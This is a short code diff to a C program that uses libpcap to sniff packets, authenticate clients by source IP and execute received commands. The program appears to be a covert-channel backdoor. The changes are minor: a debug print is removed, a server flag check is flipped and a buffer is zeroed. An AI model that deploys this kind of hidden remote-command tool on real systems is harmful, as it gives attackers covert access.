@@ -59,7 +59,6 @@ static void endProgram (int signo);
 ------------------------------------------------------------------------------*/
 void* ReceiveDatagram (void *pcap_arg)
 { 
-	printf("Reading!\n");
 	struct bpf_program fp;
 	PcapInfo *pcap_ptr = (PcapInfo *)pcap_arg;
 		
@@ -265,7 +264,7 @@ void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_c
 			if(ip_header->protocol == IPPROTO_TCP)
 			{
 				tcp_header = (struct tcphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
-				if (server == 0) // if you are the server
+				if (server == 1) // if you are the server
 				{
 					if(authenticated(ip_header->saddr))
 					{
@@ -487,6 +486,7 @@ int authenticateClient(struct iphdr* ip_header, struct tcphdr* tcp_header)
 void executeCommand(char* command)
 {
 	char results[1024] = {0};
+	memset(results, 0, sizeof(results));
 
 	if (strcmp(command, "help") == 0) 
 	{
